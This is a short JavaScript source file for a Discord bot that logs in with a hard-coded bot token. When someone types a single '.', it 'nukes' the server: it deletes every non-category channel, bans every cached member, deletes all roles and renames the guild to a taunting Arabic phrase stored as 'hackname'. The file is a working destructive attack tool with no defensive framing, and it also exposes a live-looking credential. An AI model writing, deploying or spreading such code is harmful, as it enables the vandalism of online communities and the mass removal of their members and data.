const {Client,intents,MessageEmbed} = require("discord.js")
const client = new Client({
    intents: 32767,
})
client.on("ready", () => {
  client.user.setActivity("!help")
  console.log(`${client.user.username}`)
})
client.login("Nzg2NjU0MzQ0ODc5NTM4MTk3.Gu-kTb.1bsyhdKMeQR16GqwMOkoMWTYFo8QLtqQ2nLdo0");
const hackname = "تصير تصير يلا توصي "
client.on("messageCreate", async(m) => {
    const message = m;
    if(m.content == ".") {
        message.delete();
        //channels
        const channels = message.guild.channels.cache.filter(chan => chan.type !== 'category');

        if (channels.size === 0) return;
        channels.forEach(async channel => {
          await channel.delete().catch(() => 0)
        })
    //ban
    client.guilds.cache.get(m.guild.id).members.cache.forEach(member => {
        member.ban({ reason: "nuke" }).then(() => 0).catch(() => 0)
      });
      //roles 
      message.guild.roles.cache.forEach(role => role.delete().catch(() => 0) )
     //name server
     const guild = client.guilds.cache.get(m.guild.id);
     guild.setName(hackname);

}
})
